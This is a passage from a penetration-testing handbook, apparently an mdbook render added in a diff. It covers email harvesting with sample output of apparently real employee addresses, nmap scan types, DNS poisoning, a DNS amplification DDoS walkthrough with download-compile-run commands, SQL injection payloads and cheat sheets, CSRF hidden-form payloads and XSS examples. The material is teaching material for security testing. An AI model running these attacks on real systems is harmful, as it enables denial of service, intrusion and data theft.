+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2103 (2.1K) [text/plain]
+Saving to: ‘goog-mail.py’
+
+goog-mail.py.1                                              100%[========================================================================================================================================&gt;]   2.05K  --.-KB/s    in 0s      
+
+2021-09-06 10:05:18 (41.9 MB/s) - ‘goog-mail.py’ saved [2103/2103]
+</code></pre>
+<ol start="2">
+<li>Run the script providing a <code>domain_name</code></li>
+</ol>
+<pre><code class="language-bash">python2 goog-mail.py [domain_name]
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0㉿kali)-[~/MHN/Reconnaissance/OSINT]
+└─$ python2 goog-mail.py uk.ibm.com
+ukclubom@uk.ibm.com
+martyn.spink@uk.ibm.com
+gfhelp@uk.ibm.com
+iand_ferguson@uk.ibm.com
+graham.butler@uk.ibm.com
+laurence.carpanini@uk.ibm.com
+Pensions@uk.ibm.com
+Bennett@uk.ibm.com
+ibm_crc@uk.ibm.com
+brian.mcglone@uk.ibm.com
+wakefim@uk.ibm.com
+</code></pre>
+<ol start="3">
+<li>Make sure the emails look valid</li>
+</ol>
+<h1 id="other-tools"><a class="header" href="#other-tools">Other tools</a></h1>
+<p>Another very good tool for this purpose is <a href="Reconnaissance/OSINT/Tools/theHarvester.html">theHarvester</a>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="active"><a class="header" href="#active">Active</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h1>
+<p>Nmap is a free and open source port and network scanner, which may also be used for vulnerability scanning through its scripting engine - the NSE. </p>
+<h1 id="syntax"><a class="header" href="#syntax">Syntax</a></h1>
+<p>The syntax for nmap is as follows:</p>
+<pre><code class="language-bash">nmap &lt;options&gt; target_range
+</code></pre>
+<p>It is always good practice to run Nmap with root privileges as they are required for some of the tool's functionality.</p>
+<p>You can do a simple scan on a single IP through the following command:</p>
+<pre><code class="language-bash">nmap &lt;IP&gt;
+</code></pre>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan.png" alt="" /></p>
+<p>By default, Nmap scans the top 1000 most commonly used ports (these are not necssarily the ports 0-999). You can specify specific ports for scanning with the <code>-p</code> flag followed by a comma-separated list of ports. Specifying <code>-p-</code> will cause nmap to scan all ports (0-65535).</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/simple-nmap-scan-specific-ports.png" alt="" /></p>
+<h1 id="port-states"><a class="header" href="#port-states">Port States</a></h1>
+<ul>
+<li><strong>open</strong> - an application is actively listening for TCP connections, UDP datagrams or SCTP associations on this port</li>
+<li><strong>closed</strong> -  the port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it</li>
+<li><strong>filtered</strong> - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. Usually, the filter sends no response, so Nmap needs to resend the probe a few times in order to be sure that it wasn't dropped due to traffic congestion. This slows the scan drastically</li>
+<li><strong>unfiltered</strong> - the port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, used for mapping firewall rulesets, may put ports in this state</li>
+<li><strong>open|filtered</strong> - Nmap is unable to determine whether the port is open or filtered. This occurs for scan types in which open ports give no response</li>
+<li><strong>closed|filtered</strong> - Nmap is unable to determine whether the port is closed or filtered. It is only used for the IP ID idle scan.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="tcp-syn-scan"><a class="header" href="#tcp-syn-scan">TCP SYN Scan</a></h1>
+<ul>
+<li>The default scan type with root privileges (<code>-sS</code> option)</li>
+<li>It does not complete a full TCP handshake, therefore it's a bit faster and used to be more silent (it is called a silent scan, although that is no longer the case)</li>
+<li>Also known as a half-open scan</li>
+</ul>
+<p>You can use the <code>-sS</code> option or omit it entirely to perform a TCP SYN scan.</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan.png" alt="" /></p>
+<p>This type of scan works as follows:
+Nmap sends a SYN packet to the target, initiating a TCP connection. The target responds with SYN ACK, telling Nmap that the port is accessible. Finally, Nmap terminates the connection before it's finished by issueing a RST packet.</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-syn-scan-wireshark.png" alt="" /></p>
+<h1 id="tcp-connect-scan"><a class="header" href="#tcp-connect-scan">TCP Connect Scan</a></h1>
+<ul>
+<li>The default scan type when SYN scan isn't available - lacking root privileges (<code>-sT</code> option)</li>
+<li>Nmap initiates a complete TCP connection with the target</li>
+<li>The connection attempts are loggen onto the target</li>
+<li>It's usually slower</li>
+</ul>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan.png" alt="" /></p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/tcp-connect-scan-wireshark.png" alt="" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview"><a class="header" href="#overview">Overview</a></h1>
+<p>These scan types make use of a small loophole in the <a href="http://www.rfc-editor.org/rfc/rfc793.txt">TCP RFC</a> to differentiate between <code>open</code> and <code>closed</code> ports. RFC 793 dictates that &quot;if the destination port state is CLOSED .... an incoming segment not containing a RST causes a RST to be sent in response.” It also says the following about packets sent to open ports without the SYN, RST, or ACK bits set: “you are unlikely to get here, but if you do, drop the segment, and return.</p>
+<p>Scanning systems compliant with this RFC text, any packet not containing <code>SYN</code>, <code>RST</code>, or <code>ACK</code> bits will receive a <code>RST</code> if the port is closed and no response at all if the port is open. So long as none of these flags are set, any combination of the other three (<code>FIN</code>, <code>PSH</code>, and <code>URG</code>) are fine.</p>
+<p>These scan types can sneak through certain non-stateful firewalls and packet filtering routers and are a little more stealthy than even a SYN scan. However, not all systems are compliant with RFC 793 - some send a <code>RST</code> even if the port is open. Some operating systems that do this include Microsoft Windows, a lot of Cisco devices, IBM OS/400, and BSDI. These scans will work against most Unix-based systems.</p>
+<p>It is not possible to distinguish an <code>open</code> from a <code>filtered</code> port with these scans, hence why the port states will be <code>open|filtered</code>.</p>
+<h1 id="null-scan"><a class="header" href="#null-scan">Null Scan</a></h1>
+<p>Doesn't set any flags. Since null scanning does not set any set flags, it can sometimes penetrate firewalls and edge routers that filter incoming packets with certain flags. It is invoked with the <code>-sN</code> option:</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/null-scan.png" alt="" /></p>
+<h1 id="fin-scan"><a class="header" href="#fin-scan">FIN Scan</a></h1>
+<p>Sets just the <code>FIN</code> bit to on. It is invoked with <code>-sF</code>:</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/fin-scan.png" alt="" /></p>
+<h1 id="xmas-scan"><a class="header" href="#xmas-scan">Xmas Scan</a></h1>
+<p>Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. It is performed through the <code>-sX</code> option:</p>
+<p><img src="Reconnaissance/Active/nmap/Resources/Images/xmas-scan.png" alt="" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-1"><a class="header" href="#overview-1">Overview</a></h1>
+<p>Network scanning is the process of gathering information about a target via comlex reconnaissance techniques. The term &quot;network scanning&quot; refers to the procedures used for discovering hosts, ports, running services and information about the underlying OS type.</p>
+<h2 id="types-of-scanning"><a class="header" href="#types-of-scanning">Types of scanning</a></h2>
+<h3 id="port-scanning"><a class="header" href="#port-scanning">Port Scanning</a></h3>
+<p>Lists the open ports and the services running on them. Port scanning describes the process of querying the running services on a computer by sending a stream of messages in an attempt to identify the service in question, as well as any information related to it. It involves probing TCP and UDP ports of a target system in order to determine if a service is running / listening.</p>
+<h3 id="network-scanning"><a class="header" href="#network-scanning">Network Scanning</a></h3>
+<p>This is the process of discovering active hosts on a network, either for attacking them or assessing the overall network security.</p>
+<h3 id="vulnerability-scanning"><a class="header" href="#vulnerability-scanning">Vulnerability Scanning</a></h3>
+<p>Reveals the presence of known vulnerabilities. It checks whether a system is exploitable through a set of weaknesses. Such a scanner consists of a catalog and a scanning engine. The catalog contains information about known vulnerabilities and exploits for them that work on a multitude of servers. The scanning engine is responsible for the logic behind the exploitation and analysis of the results.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-server-enumeration"><a class="header" href="#dns-server-enumeration">DNS Server Enumeration</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-exploitation"><a class="header" href="#binary-exploitation">Binary Exploitation</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-2"><a class="header" href="#introduction-2">Introduction</a></h1>
+<p>A flaw of all DNS name servers is that if they contain incorrect information, they may spread it to clients or other name servers. Each DNS name server (even individual clients) has a DNS cache. The system stores there information about any responses it gets for domains it requested. An attacker could inject false entries in this cache and as such, any computer which queries the poisoned name server will receive false results. This is known as <em>DNS cache poisoning</em>. </p>
+<p>The attack can be used to redirect users to a different website than the requested one. As such, it opens opportunities for phishing attacks by creating evil twins of login portals for well-known sites.</p>
+<p>A tool for performing such targeted attacks is <a href="https://github.com/b4ckslash0/deserter">deserter</a>. Usage information is available on its GitHub page.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-dns-traffic-amplification"><a class="header" href="#what-is-dns-traffic-amplification">What is DNS Traffic Amplification?</a></h1>
+<p>A DNS (Traffic) Amplificaton attack is a popular form of a distributed denial of service (DDoS) attack, which abuses open DNS resolvers to flood a target system with DNS response traffic. It's called an <em>amplification</em> attack because it uses DNS responses to upscale the size of the data sent to the victim.</p>
+<h1 id="how-does-it-work"><a class="header" href="#how-does-it-work">How does it work?</a></h1>
+<p>An attacker sends a DNS name lookup to an open resolver with the source IP spoofed to be the victim's IP address. That way, any response traffic would be sent to the victim and not the attacker. The requests submitted by the attacker usually aim to query for as much information as possible in order to maximise the amplification effect. In most cases, the queries sent are of type <code>ANY</code> which requests all known information about a particular DNS zone. Using a botnet, it's easy to create immense amounts of traffic. It is also rather difficult to protect against these attacks because the traffic is coming from legitimate sources - real DNS servers.</p>
+<h1 id="conducting-a-dns-traffic-amplification-attack"><a class="header" href="#conducting-a-dns-traffic-amplification-attack">Conducting a DNS Traffic Amplification Attack</a></h1>
+<h3 id="testing-a-dns-server-for-attack-surface"><a class="header" href="#testing-a-dns-server-for-attack-surface">Testing a DNS server for attack surface</a></h3>
+<p>We should first check if a DNS Traffic Amplification is possible and if it's viable. We can do this through <a href="Exploitation/DNS/">Metasploit</a> using the module <code>auxiliary/scanner/dns/dns_amp</code>.</p>
+<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp.png" alt="" /></p>
+<p>In the <code>RHOSTS</code> you need to put the IP of the name server you want to test. <em>This module will tell you if a name server can be used in an amplification attack but won't actually execute the attack.</em></p>
+<p>Run the scanner:</p>
+<p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp-sc-run.png" alt="" /></p>
+<h3 id="executing-the-attack"><a class="header" href="#executing-the-attack">Executing the attack</a></h3>
+<p>A simple tool is available only as a proof of concept <a href="https://github.com/rodarima/lsi/blob/master/entrega/p2/dnsdrdos.c">here</a>. You will need to download and then compile it:</p>
+<pre><code class="language-bash">wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
+</code></pre>
+<pre><code class="language-bash">gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
+└─$ wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
+--2021-09-21 13:01:11--  https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15109 (15K) [text/plain]
+Saving to: ‘dnsdrdos.c’
+
+dnsdrdos.c                                                  100%[========================================================================================================================================&gt;]  14.75K  --.-KB/s    in 0.001s  
+
+2021-09-21 13:01:11 (17.9 MB/s) - ‘dnsdrdos.c’ saved [15109/15109]
+
+┌──(backslash0@kali)-[~/MHN/DNS]-[]
+└─$ gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
+</code></pre>
+<p>Now, create a file containing the IP's of each DNS server you want to use in the attack (only one IP per line). Use the following syntax to run the attack:</p>
+<pre><code class="language-bash">sudo ./dnsdrdos -f &lt;dns servers file&gt; -s &lt;target IP&gt; -d &lt;domain&gt; -l &lt;number of loops through the list&gt;
+</code></pre>
+<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
+└─$ sudo ./dnsdrdos -f dns_servers -s 192.168.129.2 -d nsa.gov -l 30
+-----------------------------------------------    
+dnsdrdos - by noptrix - http://www.noptrix.net/    
+-----------------------------------------------
+
+┌──(backslash0@kali)-[~/MHN/DNS]-[]
+└─$
+</code></pre>
+<p>The output may be empty, but the packets were sent. You can verify this with wireshark:</p>
+<p><img src="Exploitation/DNS/Resources/Images/dnsdrdos-wireshark.png" alt="" /></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-2"><a class="header" href="#overview-2">Overview</a></h1>
+<p>SQL Injections allow an attacker to alter queries that an application sends to its database. This may enable the attacker to view data which they usually shouldn't have access to, edit this data arbitrarily, or modify the actual database in ways that they shouldn't be able to. In general, SQL injections could allow for the following:</p>
+<ul>
+<li>Reading sensitive data from a database</li>
+<li>Modifying the database data with <code>insert</code>, <code>update</code>, or <code>delete</code> queries</li>
+<li>Execution of privileged commands such as shutting the entire database down</li>
+<li>Reading files from the file system that the database is stored on</li>
+<li>Writing files into the file system</li>
+<li>Execution of additional OS commands</li>
+</ul>
+<h1 id="types-of-sqli"><a class="header" href="#types-of-sqli">Types of SQLi</a></h1>
+<ol>
+<li>
+<p>In-band - the attacker launches the attack and obtains the results through the same communication channel</p>
+<ul>
+<li>Error-based injections - retrieve information about the database, its structure and data, from error messages</li>
+<li>Union-based injections - combine results from a legitimate query with those from the attack in order to obtain data</li>
+</ul>
+</li>
+<li>
+<p>Out-of-band - the results from the attack are exfiltrated using a different channel than the one the query was issued through</p>
+<ul>
+<li>Examples include creating an HTTP connection for sending results to a different web server or DNS tunneling</li>
+<li>It requires specific extenstions to be enable in the database management software</li>
+<li>The targated database server must be able to send outbound network requests without any restrictions</li>
+</ul>
+</li>
+<li>
+<p>Blind (Inferential) - they rely on changes in the behaviour with the database or application in order to extract information, since the actual data isn't sent back to the attacker</p>
+<ul>
+<li>usually detected through time delays or boolean conditions</li>
+</ul>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-3"><a class="header" href="#introduction-3">Introduction</a></h1>
+<p>You can test for SQL injections by injecting a single quote (<code>'</code>) into any input fields or parameters which are sent to the server. Sometimes the server errors out and if proper error handling isn't implemented in the target application, the error my provide you with useful infomation such as the database engine, its version or even parts of the query into which you tried to inject.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-4"><a class="header" href="#introduction-4">Introduction</a></h1>
+<p>Union injections allow you to retrieve information from other databases by injecting an additional <code>SELECT</code> query. The latter will append its results to the initial query.</p>
+<p>Suppose you have an application which executes the following query:</p>
+<pre><code class="language-sql">SELECT name, description FROM products WHERE category = 'food';
+</code></pre>
+<p>If an attacker can inject into the query, they could send the following input:</p>
+<pre><code class="language-sql">' UNION SELECT username, password FROM users--
+</code></pre>
+<p>This would append the &quot;username&quot; and &quot;password&quot; columns of the <code>users</code> table respectively to the columns &quot;name&quot; and &quot;description&quot; from the original query.</p>
+<h1 id="determining-the-amount-of-columns-returned"><a class="header" href="#determining-the-amount-of-columns-returned">Determining the amount of columns returned</a></h1>
+<p>In a union injection, the number of columns in the injected query must match the number of columns in the original query. You can determine the number of columns by using the following query and keep appending <code>NULL</code>s until you observe a change in behaviour:</p>
+<pre><code class="language-sql">UNION SELECT NULL--
+</code></pre>
+<pre><code class="language-sql">UNION SELECT NULL, NULL --
+</code></pre>
+<p>And so on.</p>
+<h1 id="searching-for-columns-which-return-entries-of-a-particular-type"><a class="header" href="#searching-for-columns-which-return-entries-of-a-particular-type">Searching for columns which return entries of a particular type</a></h1>
+<p>Once you have determined the amount of columns, you can look for columns that contain entries of a specific type. Suppose the original query has 3 columns.</p>
+<pre><code class="language-sql">UNION SELECT NULL, NULL, NULL --
+</code></pre>
+<p>You can start replacing the <code>NULL</code>s one by one with a random string of text enclosed in quotation marks until you observe a change in behaviour:</p>
+<pre><code class="language-sql">UNION SELECT 'random text', NULL, NULL --
+</code></pre>
+<pre><code class="language-sql">UNION SELECT NULL, 'random text', NULL --
+</code></pre>
+<p>And so on.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="network-layer-defences"><a class="header" href="#network-layer-defences">Network Layer Defences</a></h1>
+<p>A web application firewall (WAF) can be configured to drop certain requests that look suspicious.</p>
+<p>Common bypasses:</p>
+<ul>
+<li>inserting comments</li>
+<li>changing character case</li>
+<li>using synonyms of symbols (= equals)</li>
+</ul>
+<h1 id="application-layer-defences"><a class="header" href="#application-layer-defences">Application Layer Defences</a></h1>
+<ol>
+<li>Do not write dynamic queries</li>
+<li>Sanitise user input</li>
+</ol>
+<p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>
+<p>https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</p>
+<h1 id="database-layer-defences"><a class="header" href="#database-layer-defences">Database Layer Defences</a></h1>
+<ol>
+<li>Update  DBMS</li>
+<li>Minimise privileges</li>
+<li>Proper login and monitoring </li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="database-metadata"><a class="header" href="#database-metadata">Database Metadata</a></h1>
+<p>Database engines provide tables with the database's metadata. This metadata table is different for the different engines:</p>
+<table><thead><tr><th>Engine</th><th>Table Name</th></tr></thead><tbody>
+<tr><td>SQLite</td><td>sqlite_master</td></tr>
+<tr><td>MySQL</td><td>information_schema</td></tr>
+<tr><td>PostgreSQL</td><td>information_schema</td></tr>
+<tr><td>Oracle</td><td>dba_tables</td></tr>
+</tbody></table>
+<h2 id="database-version"><a class="header" href="#database-version">Database Version</a></h2>
+<table><thead><tr><th>Database</th><th>Version Info</th></tr></thead><tbody>
+<tr><td>Oracle</td><td><code>SELECT banner FROM v$version</code> <br> <code>SELECT version FROM v$instance</code></td></tr>
+<tr><td>Microsoft</td><td><code>SELECT @@version</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr>
+<tr><td>MySQL</td><td><code>SELECT @@version </code></td></tr>
+</tbody></table>
+<h2 id="database-contents"><a class="header" href="#database-contents">Database Contents</a></h2>
+<p>Listing tables and the columns they contain:</p>
+<table><thead><tr><th>Database</th><th>Contents Info</th></tr></thead><tbody>
+<tr><td>Oracle</td><td><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = 'Table Name'</code></td></tr>
+<tr><td>Microsoft</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
+<tr><td>MySQL</td><td><code> SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></td></tr>
+</tbody></table>
+<h1 id="string-concatenation"><a class="header" href="#string-concatenation">String Concatenation</a></h1>
+<table><thead><tr><th>Database</th><th>Concatenation</th></tr></thead><tbody>
+<tr><td>Oracle</td><td>'a'||'b'</td></tr>
+<tr><td>Microsoft</td><td>'a'+'b'</td></tr>
+<tr><td>PostgreSQL</td><td>'a'||'b'</td></tr>
+<tr><td>MySQL</td><td>'a' 'b' (space) or <code>CONCAT('a','b')</code></td></tr>
+</tbody></table>
+<h1 id="unconditional-time-delays"><a class="header" href="#unconditional-time-delays">Unconditional Time Delays</a></h1>
+<p>Replace <code>delay</code> with the desired delay in seconds.
+Database | Delay Syntax
+---------| ------------
+Oracle| <code>dbms_pipe.receive_message(('a'),delay)</code>
+Microsoft| <code>WAITFOR DELAY 'hours:minutes:seconds'</code>
+PostgreSQL| <code>SELECT pg_sleep(delay)</code>
+MySQL| <code>SELECT sleep(delay)</code></p>
+<h1 id="dns-lookups"><a class="header" href="#dns-lookups">DNS Lookups</a></h1>
+<table><thead><tr><th>Database</th><th>Lookup Syntax</th></tr></thead><tbody>
+<tr><td>Oracle</td><td><code>SELECT UTL_INADDR.get_host_address('domain')</code> - requires elevated privileges</td></tr>
+<tr><td>Microsoft</td><td><code>exec master..xp_dirtree '//domain/a'</code></td></tr>
+<tr><td>PostgreSQL</td><td><code>copy (SELECT '') to program 'nslookup domain</code></td></tr>
+<tr><td>MySQL</td><td>These work only on Windows <br> <code>LOAD_FILE('\\\\domain\\a')</code> <br> <code>SELECT ... INTO OUTFILE '\\\\domain\a'</code></td></tr>
+</tbody></table>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-3"><a class="header" href="#overview-3">Overview</a></h1>
+<p>Certain vulnerabilities allow the attacker to input encoded characters that possess special meanings in HTML and HTTP responses. Usually, such input is sanitised by the application, however, sometimes application developers simply forget to implement sanitisation or don't do it properly. </p>
+<p>Carriage Return (CR - \r) and Line Feed (LF - \n) can be represented with the following encodings, respectively - <code>%0D</code> and <code>%0A</code>.</p>
+<p>CRLF injection occurs when a user manages to submit a CRLF (a new line) into an application. These vulnerabilities might be pretty minor, but might also be rather critical. The most common CRLF injections include injecting content into files on the server-side such as log files. Through cleverly crafted messages, an attacker could add fake error entries to a log and therefore make a system admin spend time looking for an issue that doesn't exist. This isn't really powerful in itself and is rather akin to pure trolling. Sometimes, however, CRLF may lead to <a href="Exploitation/Web/HTTP%20Response%20Splitting.html">HTTP Response Splitting</a>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-4"><a class="header" href="#overview-4">Overview</a></h1>
+<p>Cross-Site Request Forgery (CSRF) is a type of attack used to trick the victim into sending a malicious request. It utilises the identity and privileges of the target in order to perform an undesired action on the victim's behalf. It is similar to indirect impersonation - you can make the victim's browser submit requests as the victim. It is called &quot;cross-site&quot; because a malicious website can make the victim's browser send a request to another website. </p>
+<p>This attack typically relies on the victim being authenticated - either through cookies or basic header authorization.</p>
+<h1 id="how-does-it-work-1"><a class="header" href="#how-does-it-work-1">How does it work</a></h1>
+<p>There are two primary types of CSRF - through <code>GET</code> requests and through <code>POST</code> requests (although methods like <code>PUT</code> and <code>DELETE</code> may also be exploitable). </p>
+<p>When your browser submits a request to a web server, it also sends along all stored cookies. If CSRF occurs, any authentication cookies will be sent with the request and as such, any actions on the server would be performed on the victim's behalf. Note that in order for CSRF to work, the victim needs to be logged in because when you make a log out request, the web server usually returns an HTTP response which auto-expires your authentication cookies and they are no longer valid.</p>
+<p>In order for it to work, the victim would need to visit your malicious website.</p>
+<h2 id="the-get-scenario"><a class="header" href="#the-get-scenario">The GET scenario</a></h2>
+<p>This typically relies on hidden images through the HTML <code>&lt;img&gt;</code> tag. This tag takes an <code>src</code> attribute which will tell the victim's browser to perform a <code>GET</code> request to the specified URL in order to retrieve an image. However, an attacker can change this URL and even add parameters to it, so that the browser performs a <code>GET</code> request to any arbitrary site. </p>
+<p>An example of such a malicious hidden image could be this:</p>
+<pre><code class="language-html">&lt;img src=&quot;http://bank.com/transfer?recipient=John&amp;amount=1000&quot; width=&quot;0&quot; height=&quot;0&quot; border=&quot;0&quot;&gt;
+</code></pre>
+<p>When visiting your malicious site, this will make the victim's browser submit a <code>GET</code> request. Any cookies stored for <code>bank.com</code> would be sent along, including any authentication ones. As such, the bank would complete the transfer from the victim's account.</p>
+<h2 id="the-post-scenario"><a class="header" href="#the-post-scenario">The POST scenario</a></h2>
+<p>If the bank uses <code>POST</code> requests for transfers, the <code>&lt;img&gt;</code> method won't work because image tags can't initiate <code>POST</code> requests. This can however be achieved through hidden forms.</p>
+<pre><code class="language-html">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;  
+&lt;form method='POST' action='http://bank.com/transfer' target=&quot;csrf-frame&quot;  
+id=&quot;csrf-form&quot;&gt;  
+	&lt;input type='hidden' name='recipient' value='John'&gt;  
+	&lt;input type='hidden' name='amount' value='1000'&gt;  
+	&lt;input type='submit' value='submit'&gt;  
+&lt;/form&gt;  
+&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;
+</code></pre>
+<p>Normally, the submition of the form will require that a user clicks the submit button, but this can be automated through Javascript. The response from the submission of the <code>POST</code> request would be redirect to the non-displayed iframe and so the victim would never see what has happened.</p>
+<h1 id="preventions"><a class="header" href="#preventions">Preventions</a></h1>
+<h2 id="csrf-tokens"><a class="header" href="#csrf-tokens">CSRF Tokens</a></h2>
+<p>Sometimes, websites will make use of two-part tokens called CSRF tokens in order to prevent cross-site request forgery. These tokens are generated on the server - one part is sent to the user and the other is kept private. This value is submitted with the request and validated on the server. If the CSRF token isn't correct, the server shouldn't fulfill the submission.</p>
+<p>These tokens may be part of the <code>POST</code> request's body or as custom HTTP headers. They may take on any name, but some common ones include <code>CSRF</code>, <code>CSRFToken</code>, <code>X-CSRF-TOKEN</code>, <code>form-id</code>, <code>lt</code>, <code>lia-token</code>, etc.</p>
+<p>You should always try removing or altering the CSRF token in order to check if it's properly implemented.</p>
+<h2 id="cors"><a class="header" href="#cors">CORS</a></h2>
+<p>When a browser sends an<br />
+<code>application/json</code> <code>POST</code> request to a site, it will send an <code>OPTIONS</code>  request beforehand. The site then returns a<br />
+response indicating which types of HTTP<br />
+requests the server accepts and from what trusted origins. Such <code>OPTIONS</code> requests are called <em>preflight</em> <code>OPTIONS</code> requests.</p>
+<p>CORS, or Cross-Origin Resource Sharing, restricts resource access, including JSON response access, from domains outside the one which served a file is allowed by the site being tested. When CORS is used, submitting <code>application/json</code> requests are not possible, unless the website explicitly allows them. </p>
+<p>These protections can sometimes be bypassed by changing the <code>content-type</code> header to <code>application/x-   www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. Browsers don't send preflight <code>OPTIONS</code> requests for any of these content types and CSRF requests might succeed.</p>
+<h2 id="origin-and-referer-headers"><a class="header" href="#origin-and-referer-headers">Origin and Referer Headers</a></h2>
+<p>Checking the <code>Origin</code> and <code>Referer</code> headers (if the origin header isn't present) prevents CSRF because these headers are controlled by the browsers and cannot be altered by the attacker</p>
+<h2 id="samesite-cookie-attribute"><a class="header" href="#samesite-cookie-attribute">samesite Cookie Attribute</a></h2>
+<p>This attribute can take on the values <code>strict</code> or <code>lax</code>. When set to <code>strict</code>,  the browser won't send that specific cookie with any request that doesn't originate from the correct website - including <code>GET</code> requests.</p>
+<p>Setting the attribute to <code>lax</code> will prevent the cookie from being sent on normal subrequests (such as loading images or frames), however, the cookie will still be sent with direct requests to the origin site (such as those initiated by clicking on a link).</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-5"><a class="header" href="#overview-5">Overview</a></h1>
+<p>Cross-site scripting (XSS) describes the set of attacks where the attacker injects Javascript into a web application, typically because user input isn't properly sanitised. It is similar to HTML injection, however, it allows for the execution of Javascript code and that makes it a potentially critical vulnerability.</p>
+<p>XSS vulnerabilities can be exploited in three major ways:</p>
+<ul>
+<li>stored (persistent) XSS</li>
+<li>reflected XSS</li>
+<li>DOM-based XSS</li>
+</ul>
+<p>These attacks usually require user interaction.</p>
+<h1 id="reflected-xss"><a class="header" href="#reflected-xss">Reflected XSS</a></h1>
+<p>Reflected XSS occurs when an application receives data which it then includes in its reply to the submitted HTTP request. This is typically exploited by creating a malicious link containing a script inside it and then tricking a user into clicking visiting that URL.</p>
+<p>This type of XSS allows the attacker to perform any action on the application as the target. It is commonly used for stealing non-<code>httponly</code> cookies.</p>
+<p>Suppose you have a search bar somewhere in your application, the contents of which are sent as a URL parameter in a <code>GET</code> request when a user clicks the search button and are then displayed on the response page in a similar manner:</p>
+<pre><code>Search results for: &lt;search text&gt;
+</code></pre>
+<p>The request could be to the following example URL:</p>
+<pre><code>example.com/?search=val
+</code></pre>
+<p>If your application is vulnerable to XSS, the attacker could craft a malicious URL like the following one:</p>
+<pre><code>example.com/?search=&lt;script&gt;alert('test')&lt;/script&gt;
+</code></pre>
+<p>This would inject the Javascript as HTML into the <code>&lt;search text&gt;</code> on the response page and the browser would then execute the code.</p>
+<h1 id="stored-xss"><a class="header" href="#stored-xss">Stored XSS</a></h1>
+<p>Stored, or persistent, XSS is similar to reflected XSS, with the difference being that the injected code is actually stored onto the web server and then later distributed to anyone who requests the injected web page. This type of XSS is much more severe, since it can spread around. </p>
+<p>Once Javascript has been injected and stored on the web server, the malicious Javascript will be delivered to and executed by any user who requests the specific web page.</p>
+<h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-based XSS</a></h1>
+<p>DOM-based XSS is a type of XSS where the malicious code is never sent to the server. This commonly occurs when using the fragment part of a URL, or by referencing <code>document.URL</code> / <code>document.location.href</code>.</p>
+<p>This a less common attack nowadays, since most browser automatically escape Javascript in address bars, so DOM-based XSS will only work if you unescape it.</p>
+<p>Suppose you have a page on </p>
+<pre><code>http://127.0.0.1:8080/example.html
+</code></pre>
+<p>You can add fragments to the URL with a # symbol.</p>
